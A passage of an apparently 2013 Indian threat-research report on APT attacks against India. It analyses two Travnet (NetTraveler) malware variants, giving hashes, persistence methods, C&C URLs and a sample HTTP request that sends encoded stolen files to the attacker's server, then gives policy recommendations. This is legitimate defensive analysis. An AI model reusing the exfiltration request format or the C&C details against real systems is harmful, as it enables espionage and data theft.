The\nreport goes on to document a detailed analysis of targeted malware\nand lists a small number of Indian-based companies that were\npotentially threat actors involved in the campaign.\n\nWhile the ‘Hangover’ report itself has been widely debated in the\nIndian Information Security community, there is little proof, beyond\ncircumstantial evidence provided in the Norman report, that Indian\nactors were behind this APT campaign, and the larger concern\nremains that India is the victim of numerous APT campaigns, rather\nthan an instigator of this threat.\n\nAs our Government is rapidly migrating towards e-governance, it is\nvital to ensure a robust approach to data security is implemented\nfrom an early stage to prevent misuse and subsequent attacks on\ncritical infrastructure and the national economy. A quick look at\nIndia's history with respect to battling cyber threats, reveals an ageold & on-going war between the “hackers” from various Nations. Defacement of Indian government sites date\nback to the year 2003 & even today, they continue to happen.\n\nIn this report, we analyse the various facts and provide in-depth analysis of an “Advanced persistent threat” attack\non India that makes us ask – Are we the hunter or the hunted?\n\n###### How is this report organized?\n\n  - Part one – Hunter or the Hunted?\n\n  - Part two – Advanced persistent threat - analysis\n\n  - Part three - Primary Causes\n\n  - Part four - Recommendations\n\n###### APT campaigns against India\n“Advanced persistent threat” or APT as it is known, is a reality today. Unlike the regular script-kiddie attacks that\nare carried out usually for fun or for fame, APTs are serious campaigns, undertaken by groups with a variety of\nskill-sets. The focus of an APT campaign usually is to gather valuable information against specific companies /\norganizations or selected sectors of a country. These usually begin with highly targeted spear-phishing attacks.\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n###### Malware Distribution in India\nOut of 25,935 websites scanned by Google, 14% websites were infected by Malware.\n\n###### Overview of attacks on India from 26[th] May 2013 to 26[th] June 2013\n\n AS = Attack Sites\n\n Attacked and compromised websites from TATA Communications\n\n Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n###### Attacked and compromised websites from Web Werks\n\n Attacked and compromised websites from Net Magic Datacenter Mumbai\n\n Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n###### Attacked and compromised websites from Ctrl-S Datacenter\n\n Attacked and compromised websites from Net4India\n\n Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n###### Attacked and compromised websites from National Informatics Center (NIC)\n\n Statistics from CERT-IN\nTo make some sense of the current scenario of cyber security in India, let’s have a look at some of the statistics\npublished by CERT-India. The following table should give us a good idea of how things are shaping up.\n\n**Activity** **2006** **2007** **2008** **2009** **2010** **2011**\nSecurity Incidents handled 552 1237 2565 8266 10315 13301\nSecurity Alerts issued 48 44 49 29 43 48\nAdvisories Published 50 66 76 61 72 81\nVulnerability Notes Published 138 163 197 157 274 188\nSecurity Guidelines Published 1 1 1 0 1 4\nWhite papers/Case Studies 2 2 1 1 1 3\n\nPublished\n\nTrainings Organized 7 6 18 19 26 26\nIndian Website Defacements 5211 5863 5475 6023 14348 17306\n\ntracked\n\nOpen Proxy Servers tracked 1837 1805 2332 2583 2492 3294\nBot Infected Systems tracked 0 25915 146891 3509166 6893814 6277936\n\nIt’s not surprising to note that the threats are increasing at an alarming rate, year after year. In a way, it’s\nheartening to observe the CERT evolve & rise upto newer challenges & latest threats.\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n|Activity|2006|2007|2008|2009|2010|2011|\n|---|---|---|---|---|---|---|\n|Security Incidents handled|552|1237|2565|8266|10315|13301|\n|Security Alerts issued|48|44|49|29|43|48|\n|Advisories Published|50|66|76|61|72|81|\n|Vulnerability Notes Published|138|163|197|157|274|188|\n|Security Guidelines Published|1|1|1|0|1|4|\n|White papers/Case Studies Published|2|2|1|1|1|3|\n|Trainings Organized|7|6|18|19|26|26|\n|Indian Website Defacements tracked|5211|5863|5475|6023|14348|17306|\n|Open Proxy Servers tracked|1837|1805|2332|2583|2492|3294|\n|Bot Infected Systems tracked|0|25915|146891|3509166|6893814|6277936|\n\n\n-----\n\nUnfortunately, it’s not enough. The reports submitted by CERT do not take into account the most fundamental\naspects of maintaining a state of secure IT environment. This fact is evident from the number of security incidents\nthat happen over an year & how the right authorities react to them. If every reported incident was handled properly\nby identifying the root cause, followed by a full security audit, we wonder if the numbers would grow so fast. As\nmentioned earlier, cases of government sites being defaced date back to 2003. Even today, one can find servers\nrunning older & vulnerable versions of software, poor server management, web applications deployed on these\nservers being designed & implemented by programmers who lack awareness of secure coding practices, to name\na few. The private sector though, is much more cautious & alert when it comes to their IT infrastructure compared\nto the government.\n\n###### Attack on Indian IT Infrastructure: Zone-H Statistics\nLet’s analyse the state of government's IT infrastructure in the following pages.\n\nWhile the statistics presented by CERT-In looks alarming by itself, the actual state of domains that end with\n[“gov.in”, is much worse. A quick look at the following recent screenshot of www.zone-h.org site provides some](http://www.zone-h.org/)\nshocking insight. According to the site, the current statistics are as follows:\n\nTotal Notifications : 1299\n\nMass defacements : 753\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n# PART TWO:\n\n ADVANCED PERSISTENT\n THREAT\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n#### PART TWO: ADVANCED PERSISTENT THREAT - ANALYSIS\n\n###### The Travnet Case\nA recent incident that caught our attention was the “Travnet” case. We carried out a preliminary analysis of our\nown on the subject. Kaspersky as well as McAfee amongst others, have published detailed analysis of the malware\n& the campaign.\n\nOur focus was to understand the nature of the group behind the attack & its agenda. It began with Kaspersky's\nrevelation of the attack. We recommend you to go through Kaspersky & McAfee's analysis of the malware to know\nmore about the spear phishing campaign & the exploits used.\n\nOur analysis is currently focussed only on the malware samples that are dropped on the target systems, as the\nexploits used during the spear-phishing campaign are older & already patched by the respective vendors.\n\nTo summarize the modus operandi of the attack, targeted phishing mails were sent to individuals, having Office\ndocuments as attachments. These documents exploited previously known vulnerabilities ( CVE-2012-0158 and\nCVE-2010-3333 ) to drop “Travnet” malware onto the systems. Its fascinating to note that the attachments that\nwere sent to Indian targets were carefully selected & some of them were named as follows:\n\n  - “Army Cyber Security Policy 2013.doc”\n\n  - “Jallianwala bagh massacre a deeply shameful act.doc”\n\n  - “Report - Asia Defense Spending Boom.doc”\n\n  - “His Holiness the Dalai Lama’s visit to Switzerland day 3.doc”\n\n  - “BJP won’t dump Modi for Nitish NDA headed for split.doc”\n\nAs its evident, the group behind the attack obviously has done extensive research on topics that are current as\nwell as intriguing to the Indian targets. We managed to acquired 2 variants of the “Travnet” malware & our\nanalysis of the same is as follows.\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n###### Travnet Technical Analysis: Part A\n\nFile details :\n\nFilename travnet_A.exe\n\nMD5 d286c4cdf40e2dae5362eff562bccd3a\n\nSHA1 25ac3098261df8aa09449a9a4c445c91321352af\n\nSHA256 a75fdd9e52643dc7a1790c79cbfffe9348f80a9b0984eafd90723bf7ca68f4ce\n\nFilesize 97792 bytes\n\nFiletype PE32 executable (GUI) Intel 80386, for MS Windows\n\nA quick analysis by PEiD reveals that the binary is not packed or protected.\n\nIt begins by creating a new mutex object, named “ INSTALL SERVICES NOW!”.\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nNext step is to create a configuration file named “config_t.dat” in the windows' “system” folder.\n\nIt then\npopulates it\nwith the\nright\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nparameters, after decoding them.\n\nAfter the configuration file is written, it checks if the malware was previously installed or not, if not, it creates a\ndynamic-link library in the “system32” folder, creates a temporary batch file named as “temp.bat” which installs\nthe previous DLL as a service on the system. The name of the DLL that is created, is based upon the values of the\ndata from “netsvcs” from the following registry key : “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Svchost”. During this runtime, it turned out to be “6to4ex.dll” but it can change from runtime\nto runtime.The malware then deletes the batch file. Its obvious that this executable basically acts as a dropper.\nThe contents of the batch file & the configuration file generated are as follows.\n\nBatch file : temp.bat\n\nConfiguration file : config_t.dat\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nNext section focuses on the analysis of the DLL (“6to4ex.dll”) that was dropped by this executable.\n\n###### Analysis of “6to4ex.dll”\n\nFile Details\n\nFilename 6to4ex.dll\n\nMD5 452660884ebe3e88ddabe2b340113c8a\n\nSHA1 b80d436afcf2f0493f2317ff1a38c9ba329f24b1\n\nSHA256 ed6ad64dad85fe11f3cc786c8de1f5b239115b94e30420860f02e820ffc53924\n\nFiletype PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\n\nFilesize 46592 bytes\n\nC&C url http://www.newesyahoo.com/traveler1/net/nettraveler.asp\n\nA quick analysis by PEiD reveals that the binary is not packed or protected.\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nNow, as we know already, this DLL was installed as a service by the previous dropper. Analysis of the\n“ServiceMain” function of the DLL throws light on many interesting things. The first thing it does upon execution\nis to create a new mutex object named “NetTravler Is Running!”. Its usually done to avoid running multiple\ninstances of the same malware.\n\nNext, it reads the configuration file.\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nAdditionally, it also creates few interesting files in the “system32” folder.\n\nThe filenames are quite indicative of what their contents might be.\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n“enumfs.ini” as the name suggests, is a complete list of all files and folders on the computer. “dnlist.ini” seems to\nbe noting down the date & time. “system_t.dll” on the other hand, contains a broad category of sensitive\ninformation about the computer like the “Computer Name”, Windows version, IP address, list of running\nprocesses, network information & so on. The contents of the files are as follows\n\nFilename : “system_t.dll”\n\nUpon proper character encoding & use of google's Translate feature, it turns out to be “Chinese”.\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nFilename : “enumfs.ini”\n\nFilename : “dnlist.ini”\n\nAnother interesting aspect of Travnet is that it can specifically search for files of the type “doc, docx, xls, xlsx, txt,\nrtf, pdf” on the victim machine. This provides enough hint that this malware was designed to steal confidential\ninformation unlike the usual botnet variants that focus primarily on providing remote access to the system or to\nact as zombies for launching DDOS attacks.\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nTo summarize, the Travnet malware initially collects system information, a list of files on the victim machine\namong others, then sends this data to the remote Command & Control (C&C) server, by using custom\ncompression & encoding functions. The malware creates a new file with the naming convention as follows :\n“travlerbackinfo-%d-%d-%d-%d-%d.dll”, where the signed integer values are replaced by the current system\ndate & time, copies the content of “system_t.dll” into it & then, uploads it to the C&C.\n\nIt also uploads the list of files found on the victim machine, which was saved in the “enumfs.ini” file to the remote\nserver, by copying its contents to a new file, named following this format:\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n“FileList-%02u%02u-%02u%02u%02u.ini”\n\nIt doesn't stop at that, it even uploads the victim's files onto the remote C&C that have the file extensions “doc,\ndocx, xls, xlsx, txt, rtf, pdf” as well as the files on the victim's desktop folder. Another important aspect of Travnet\nis the fact that it uses a custom compression & encoding algorithm on the data collected, before its sent to the\nremote C&C. A typical file upload communication between the bot & the C&C looks like this:\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nAn actual HTTP GET request looks like this:\n\n“http://www.newesyahoo.com/traveler1/net/nettraveler.asp?hostid=00CD1A40&hostname=ComputerName&ho\nstip=127.0.0.1&filename=FileList-0523131103.ini&filestart=0&filetext=begin::RgAxAC2QzebTgdToZTkXQaCicYTaZR72HWSigYTPHjEZDUZTvgBrOEmQ0\nnIxm86m46D0YTg*::end”\n\nHere, the data between “begin::” & “::end” is the actual file content, that was compressed & encoded by the bot.\nIt seems that this older variant of the Travnet malware supported 4 different types of commands from the\nremote C&C and they are as follows:\n\n  - UNINSTALL\n\n  - UPDATE\n\n  - RESET\n\n  - UPLOAD\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nThat concludes Part-A of our Travnet analysis.\n\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n###### Travnet Technical Analysis: Part B\n\nFile details :\n\nFilename travnet_B.exe\n\nMD5 9d22897b05261ad66645887b094a43c7\n\nSHA1 dc63b4b9ee2f8486b96ce62be4a31e041d422ef7\n\nSHA256 e547e8a8bc27d65dca92bc861be82e1c94b9c9aca8a2b75381e9b16e4ad89600\n\nFiletype PE32 executable (GUI) Intel 80386, for MS Windows\n\nFilesize 102400 bytes\n\nC&C Url http://www.viprambler.com/newsinfo/uld/nettraveler.asp\n\nA quick analysis by PEiD reveals that the binary is not packed or protected.\n\nThis executable is apparently an updated variant of Travnet. The major changes are as follows:\n\n  - It’s an executable & not a DLL.\n\n  - The compression algorithm has been modified.\n\n  - It tries to install itself on the victim machine to achieve persistence instead of dropping other payloads.\n\n  - Supports just 2 instructions from the C&C instead of 4, like in the previous version.\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nApart from these, there isn't much difference. The following analysis only focuses on what has changed.\n\nIt achieves persistence by copying itself to the currently logged-in user's “temp” folder as “csmss.exe” & placing\na shortcut to it, named as “seruvice.lnk” in the “startup” folder.\n\nThe next step it to create a new mutex object to avoid running multiple instances. It names the mutex as\n“Assassin”.\n\nAfter this, it generates a unique 8 characters long “hostid”, based on volume serial number to identify the bot.\nThis is common to the previous variant too.\n\nThen it checks if the victim machine is connected to the internet or not, by trying to resolve “smtp.live.com” & if\nthat fails, as a second attempt, “smtp..yahoo.com”.\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nThe strings displayed above, are actually in “Chinese” & turn out to be :\n\n   - “You can connect to the network.”\n\n   - \"Unable to connect to the network.\"\n\nUnlike the previous variant, this one doesn't seem to collect sensitive information about the victim machine. It\njust makes a list of all files & folders on the victim machine & dumps it into a file named as\n\n“AllIndex.ini”. Next step is to compress the contents of this file, copy the compressed content to a new file named\nas “AllIndex.ini_d” & then delete the previously created clear-text file. The contents of both the files are as\nfollows:\n\nFilename : AllIndex.ini\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nFilename : AllIndex.ini_d\n\nIt’s pretty obvious that the compression ratio achieved by the custom algorithm is quite high from the following\nimage:\n\nApart from that, this variant also creates a file that lists all the currently running processes on the victim machine,\ninto a text file named “Process.dll” inside the currently logged-on user's “temp” folder. This variant also uses a\nmodified naming convention to upload files onto the remote C&C. The only other major difference from the\nprevious variant is the fact that this one only supports 2 commands from the remote C&C server, instead of 4 &\nthey are as follows:\n\n  - Uninstall\n\n  - Upload\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nThe C&C server in case of this variant was located at :\n\n[\"http://www.viprambler.com/newsinfo/uld/nettraveler.asp\"](http://www.viprambler.com/newsinfo/uld/nettraveler.asp)\n\n###### Travnet Technical Analysis : Part C\n\nApart from analyzing the malware samples, we also tried to gather as much information about the C&C servers\nas we could. The fact that even after a lot of research papers being published on the analysis of the Travnet\nmalware, some of the C&C servers are still active & functioning, is noteworthy. We were able to locate a few of\nthem. The ones that caught our attention are currently hosted on these domains :\n\n  - www.pkspring.net\n\n  - [www.viprambler.com](http://www.viprambler.com/)\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n[Let’s start with the analysis of “www.viprambler.com”. WHOIS record for the domain currently is as follows:](http://www.viprambler.com/)\n\nRegistrant information for the domain is as follows :\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nOur analysis strongly suggests that the group behind Travnet might be from China. The above record is just one\nof the findings that supports the claim. Its interesting to note that the domain was recently registered, is locked\n& expires in 2014. Another interesting observation is the address of the registrant. “Guangdong” province from\nChina seems to pop up everywhere. Its also noteworthy that the domain is still active & still hosting the Travnet\nC&C. We've also observed that the C&C now remains active only during specific time of the day. The time-stamp\nfrom the images below, confirms this.\n\nActive response from the C&C :\n\nC&C server refusing connection later on the same day :\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nIts obvious that even after the discovery of the malware, the group behind this specific attack is determined to\nkeep it alive. The Travnet malware as well as its C&C infrastructure is constantly evolving. Lets move onto the\nnext active domain.\n\nThe Travnet C&C hosted at “pkspring.net” seems to be fully functional & active all the time. The response from\nthe server when opened from a browser is as follows:\n\nAnother interesting finding is the fact that it hosts Travnet C&C on 3 different ports on the server. They are as\nfollows:\n\n  - 80\n\n  - 443\n\n  - 8080\n\nIts evident from the following pictures.\n\nPort 443\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nPort 8080\n\nMoving on, we found out that 21 domains are hosted on the same server at the moment. And all of them are\nactive C&C servers for the Travnet malware. They also seem to have interesting domain names. Its an indication\nof the seriousness of the campaign.\n\nOther domains hosted & owned by the same group on the same server/IP :\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nThe image below proves that all of the above domains serve the same Travnet C&C on the same 3 ports, each.\n\nAfter this, we focused our attention on the WHOIS details of these domains. At the moment, the details of the\nregistrant is kept private & it was recently updated. Its also interesting to note that the group behind this has\nensured that the domain cannot be taken over by someone else. The following page contains the current WHOIS\ndata for the domain.\n\n“Pkspring.net” WHOIS data (Recent)\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nRegistrant details for the domain :\n\nNothing much to go on there at the moment. But thanks to older WHOIS records, we found out some interesting\nfacts.\n\nThe same domain was earlier registered as follows:\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nIt was apparently created on 20-march-2009 & its expiration date was set to 20-march-2013. The registrant's\ninformation at that time was as follows:\n\nThe above data seems familiar. The only difference now being that the domains have be renewed, registration\n[details kept private & the email ID of the registrant has changed from “livep92@hotmail.com” to](mailto:livep92@hotmail.com)\n[“chenjm@sina.com”, which belongs to a private Chinese mail service (http://mail.sina.com.cn/) . The same thing](mailto:chenjm@sina.com)\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nhas happened with other publicly disclosed Travnet C&C domains. We also fetched details of another domain\nthat previously hosted Travnet C&C & has been recently renewed, most likely by the same group.\n\n[A search for the email “livep92@hotmail.com” led us to the following page :](mailto:livep92@hotmail.com)\n\nThe above listed domains are already known to have hosted the Travnet C&C. We did some research on the\ncurrent status of one of the domains from the above list, “discoverypeace.org”. The current WHOIS data for the\ndomain “discoverypeace.org” is as follows:\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nThis looks strikingly similar to the current status of the active C&C domain “pkstring.net”. It was also recently\nupdated. The older WHOIS entry for the same domain was as follows :\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n###### Conclusion of Travnet Analysis:\n\nFrom our analysis of the Travnet malware so far, it’s quite evident that many things hint at the origin of this\ncampaign to be from China. It’s also a known fact the Indian government & other important sectors from India\nwere heavily targeted during this campaign. T\n\nThe fact that this was a highly targeted attack & focused on stealing confidential documents & sensitive\ninformation makes it noteworthy.\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n# PART THREE:\n\n PRIMARY CAUSES\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n#### PART THREE: PRIMARY CAUSES\n\n###### What are the primary causes of weak Indian Cyber Space?\n\n Use of Outdated Software on Government Websites\n\nAnother interesting finding is the fact that many of the servers that host “gov.in” sites are running outdated\nsoftware versions.\n\nAs an example, from the above image, it is evident that the domain “karnataka.gov.in” is hosted on a server running\n“Windows Server 2003”, on 22-June-2013. To confirm this, we ran an nmap scan & it’s not surprising to find out\nthat the information is true. The screenshot of our nmap scan is as follows:\n\nWhile use of outdated software is one of the major concerns, it seems most of the Indian government sites are\nriddled with vulnerable code too. It’s quite common to locate webshells on these sites.\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n###### Webshells on Indian Websites \nOne of the many live webshells we found recently during our analysis is shown in the following image:\n\nFrom the time-stamps on the above image, it’s evident that this is webshell is still active at the time of this this\nwriting. An example of a government site that’s not properly managed & discloses highly sensitive information is\nas follows:\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\nThe above screenshot is just one of the many live examples of poorly managed web servers that do not follow\neven the most basic web application security guidelines. Even important government sites, access to which can\nlead to much deeper intrusion seem to be managed with little care. The following image is just one of the\nexamples of developing or customizing a CMS & not properly handling access-control.\n\nWhile defacements are usually carried out by hackers just for fun or fame, in a way its a boon in disguise. Serious\nhackers can cause much more damage & remain unnoticed for a very long time by having access to the\nprivileges these hackers abuse to deface the site. Slowly but steadily, serious APT campaigns are on the rise. Its\nvery important for the nation to start upgrading its IT infrastructure & keep up with the latest security guidelines\n& practices. The next part of this research paper focuses on a recent APT campaign against multiple countries\nincluding India was targeted.\n\nWhile each and every technical cause for weak Indian Cyber space is beyond the scope of this document, we also\nbelieve that India requires a strong policy driven approach along with inspiring leadership from thought leaders\nand Government departments in Information security to bring the much needed change.\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n# PART FOUR:\n\n RECOMMENDATIONS\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n#### PART FOUR: RECOMMENDATIONS\n\nWe recommend the following\n\n###### Policy on Domain Name acquisition, management & maintenance\nThe Domain name acquisition, management and maintenance policy should address the process to protect and\nmanage the crucial online identities of Indian Government Domains. At present there is no consistent policy to\nacquire and manage the domains. The policy should address:\n\n1. Naming convention to be followed for official Government domains to prevent misuse by domain\n\nsquatters\n2. A Government body that is responsible to register, administer and manage the domains\n3. Consistent working administrative and management contacts for WHOIS query\n4. Systematic policy to acquire domains and renew them on timely basis\n5. A policy to ensure “Domain Authorization keys” are managed properly and maintained in proper chain of\n\ncustody, secured in a bank locker and handled with systematic process\n\n###### Policy on Vendor qualification for secure website development\nIt is crucial to select the right vendors for developing security websites and web applications for all Government\nprojects. The policy should address:\n\n1. Qualification parameters for selection of vendor for web site and web application development\n2. Certified Staff by vendor working on Government projects for Information security and secure coding\n3. Quarterly vulnerability assessment and penetration testing of all websites\n4. Security Classification of websites that determine parameters of vendor approval\n5. Comprehensive development and support contract from vendor that covers data security and associated\n\npenalties in event of breach\n\n###### Policy on Patch Management\nWhile it is possible that such a policy exits with organizations such as NIC, it is important to ensure these are\nimplemented in a timely manner. The policy on patch management must ensure outdated software must be\nsecured appropriately and updated as per Industry standards. The policy must address:\n\n1. Adequate test bed environment for testing new updates for software, patches etc\n2. Comprehensive UAT (User Acceptance Testing) before implementation of critical security patches\n3. Policy to ensure critical security updates are deployed within a specified time from date of release\n4. Backup of data and roll back methodologies in event of patch deployment issues\n5. Monitoring of critical updates and patches and appropriate classification of the same for deployment\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----\n\n###### Policy, Process and Guidelines on Full disclosures India has a strong community of Information security experts who can support the Indian Government and strengthen overall security of our cyber space. As the nature of such community is dynamic and rapidly evolving, it is important for the Indian Government to setup a policy and process for responsible full disclosures when Indian citizens report possible vulnerabilities in critical digital assets of India. These must address:\n\n 1. Process by which any citizen of India can safely submit and report vulnerabilities, full disclosures in Indian\n websites to an authorized agency without fearing action of IT Act law  2. Guidelines under which, the security experts from the Indian community can communicate, assist and\n support law enforcement and responsible agencies in effectively addressing security gaps in Indian Cyber space. 3. Process to act on security incidents reported by the security community in a timely manner. 4. Guidelines to industry at large on how to cooperate with security experts who disclose security issues in\n their organizations 5. Guidelines to the citizens on being Cyber aware and how to help the Government in securing the economy\n of the country from malicious hackers\n\n Role of National Security Database National Security Database (NSD) is a prestigious empanelment program awarded to credible & trustworthy Information security experts with proven skills to protect the National Critical Infrastructure & economy of the country.\n\n The National Security Database project has been generously endorsed and supported by NTRO and CERT and has been playing an important role in raising the cyber safety awareness across the Nation as well as engaging the community in improving the overall cyber space of India. \n\nWe sincerely believe that in coming years, the program will create a strong and credible cyber workforce that can\nhelp the Indian Government in both offense and defence of its Cyber Space.\n\n###### References:\n\n[http://www.securelist.com/en/downloads/vlpdfs/kaspersky-the-net-traveler-part1-final.pdf](http://www.securelist.com/en/downloads/vlpdfs/kaspersky-the-net-traveler-part1-final.pdf)\n\n[http://blogs.mcafee.com/mcafee-labs/travnet-botnet-controls-victims-with-remote-admin-tool](http://blogs.mcafee.com/mcafee-labs/travnet-botnet-controls-victims-with-remote-admin-tool)\n\n[https://www.virustotal.com/en/ip-address/182.50.130.68/information/](https://www.virustotal.com/en/ip-address/182.50.130.68/information/)\n\n[http://www.threatexpert.com/report.aspx?md5=0f23c9e6c8ec38f62616d39de5b00ffb](http://www.threatexpert.com/report.aspx?md5=0f23c9e6c8ec38f62616d39de5b00ffb)\n\n[http://www.deccanchronicle.com/130608/news-current-affairs/article/india-loses-22gb-data-cyber-attack](http://www.deccanchronicle.com/130608/news-current-affairs/article/india-loses-22gb-data-cyber-attack)\n\n[http://newindianexpress.com/nation/Cyber-defences-are-not-robust-enough/2013/06/16/article1636933.ece](http://newindianexpress.com/nation/Cyber-defences-are-not-robust-enough/2013/06/16/article1636933.ece)\n\n###### Powered by Po Anti-virus from www.researchbundle.com\n\n\n-----",
